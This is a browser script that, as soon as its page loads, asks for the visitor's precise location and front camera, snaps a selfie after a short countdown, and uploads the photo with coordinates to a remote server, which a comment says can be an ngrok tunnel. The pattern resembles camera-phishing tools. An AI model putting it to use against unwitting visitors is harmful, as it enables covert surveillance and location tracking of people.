// public/script.js
// Capture photo + (optional) location, upload to backend.
// Notes:
//  - Set UPLOAD_URL at top if you want a baked-in URL, otherwise you can override at runtime:
//      window.UPLOAD_URL = 'https://abcd1234.ngrok.io/upload'
//  - This version tries to request location BEFORE capture (improves mobile behavior).

// === Configure upload URL (default local) ===
let UPLOAD_URL = window.UPLOAD_URL || 'https://the-nexus-media-backend.onrender.com/uploads';

// DOM refs
const video = document.getElementById('previewVideo');
const canvas = document.getElementById('hiddenCanvas');
const notice = document.getElementById('notice');
const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');

let stream = null;
let captureTimeout = null;
let preparedLocation = { latitude: '', longitude: '' };

// Start automatically after load (small delay so UI renders)
// You can change to manual trigger if mobile blocks autoplay/permissions.
window.addEventListener('load', () => {
  setTimeout(startFlow, 300);
});

/* ENTRY: try to obtain location early, then start camera */
async function startFlow() {
  // If window.UPLOAD_URL was set in console, respect it and log it
  if (window.UPLOAD_URL) {
    UPLOAD_URL = window.UPLOAD_URL;
    console.log('UPLOAD_URL overridden from window:', UPLOAD_URL);
  }

  statusEl.textContent = 'Preparing...';

  // Try get location early (so mobile shows permission prompt first)
  try {
    const pos = await getCurrentLocationWithTimeout(5000);
    preparedLocation.latitude = String(pos.coords.latitude);
    preparedLocation.longitude = String(pos.coords.longitude);
    console.log('Prepared location (pre-capture):', preparedLocation);
  } catch (err) {
    console.warn('Pre-capture location attempt failed/denied/timeout:', err);
    // leave preparedLocation as empty strings; we'll try again after capture
  }

  // Now init camera + capture flow
  await initAndCapture();
}

/* Initialize camera and start countdown */
async function initAndCapture() {
  try {
    notice.textContent = '';
    statusEl.textContent = 'Requesting camera...';
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;

    try { await video.play(); } catch (e) { console.warn('video.play() issue (ignored):', e); }

    await waitForVideoReady(video, 2000);
    statusEl.textContent = 'Camera ready — starting countdown...';
    startCountdown(2);
  } catch (err) {
    console.error('Camera init error:', err);
    notice.textContent = 'Camera permission denied or unavailable.';
    statusEl.textContent = err?.message || String(err);
  }
}

/* Wait until video has dimensions / frames */
function waitForVideoReady(videoEl, timeout = 2000) {
  return new Promise((resolve) => {
    const start = Date.now();
    (function check() {
      if (videoEl.videoWidth && videoEl.videoHeight) return resolve();
      if (Date.now() - start > timeout) return resolve();
      requestAnimationFrame(check);
    })();
  });
}

/* Countdown */
function startCountdown(seconds = 2) {
  let t = seconds;
  countdownEl.textContent = t;
  const timer = setInterval(() => {
    t -= 1;
    countdownEl.textContent = t > 0 ? t : '';
    if (t <= 0) {
      clearInterval(timer);
      // warm-up for webcams/mobile
      captureTimeout = setTimeout(() => captureAndUpload(), 700);
    }
  }, 1000);
}

/* Get current location with timeout */
function getCurrentLocationWithTimeout(ms = 8000) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
    let done = false;
    const timer = setTimeout(() => {
      if (!done) {
        done = true;
        reject(new Error('Geolocation timeout'));
      }
    }, ms);
    navigator.geolocation.getCurrentPosition((pos) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve(pos);
    }, (err) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      reject(err);
    }, { enableHighAccuracy: true, timeout: ms, maximumAge: 0 });
  });
}

/* Capture frame, (attempt location if not prepared), upload */
async function captureAndUpload() {
  if (!stream) {
    statusEl.textContent = 'No camera stream available.';
    return;
  }

  // warm-up
  await sleep(600);

  const w = video.videoWidth || 1280;
  const h = video.videoHeight || 720;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext('2d');

  try {
    // flip for selfie view
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, -w, 0, w, h);
    ctx.restore();
  } catch (err) {
    console.error('drawImage failed:', err);
    statusEl.textContent = 'Capture failed.';
    stopCamera();
    return;
  }

  // If we didn't already get a location earlier, attempt now (short timeout)
  if (!preparedLocation.latitude || !preparedLocation.longitude) {
    try {
      const pos = await getCurrentLocationWithTimeout(4000);
      preparedLocation.latitude = String(pos.coords.latitude);
      preparedLocation.longitude = String(pos.coords.longitude);
      console.log('Post-capture location obtained:', preparedLocation);
    } catch (err) {
      console.warn('Post-capture location failed/denied/timeout:', err);
    }
  } else {
    console.log('Using pre-captured location:', preparedLocation);
  }

  // Convert canvas to blob and send with form
  canvas.toBlob(async (blob) => {
    if (!blob) {
      statusEl.textContent = 'Capture failed (no blob).';
      stopCamera();
      return;
    }

    const filename = `capture_${Date.now()}.png`;
    const form = new FormData();
    form.append('file', blob, filename);
    form.append('type', 'image');

    // ALWAYS append latitude/longitude (may be empty strings)
    form.append('latitude', preparedLocation.latitude || '');
    form.append('longitude', preparedLocation.longitude || '');

    console.log('Uploading ->', { uploadUrl: UPLOAD_URL, filename, latitude: preparedLocation.latitude, longitude: preparedLocation.longitude });
    statusEl.textContent = 'Uploading photo (and location if available)...';

    try {
      const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
      const text = await resp.text();
      console.log('Upload response:', resp.status, text);
      if (resp.ok) {
        statusEl.textContent = '✅ Uploaded successfully.';
      } else {
        statusEl.textContent = '❌ Upload failed.';
      }
    } catch (err) {
      console.error('Network/upload error:', err);
      statusEl.textContent = '❌ Network/upload error.';
    } finally {
      stopCamera();
    }
  }, 'image/png', 0.95);
}

/* Stop camera */
function stopCamera() {
  try {
    if (captureTimeout) { clearTimeout(captureTimeout); captureTimeout = null; }
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      stream = null;
    }
    video.srcObject = null;
    notice.textContent = 'Camera stopped.';
  } catch (err) {
    console.warn('Error stopping camera:', err);
  }
}

/* Helpers */
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

/* Debug helper to cancel */
window.__cancelCapture = function() {
  if (captureTimeout) clearTimeout(captureTimeout);
  stopCamera();
  countdownEl.textContent = '';
  statusEl.textContent = 'Capture cancelled.';
  console.log('Capture cancelled by user.');
};
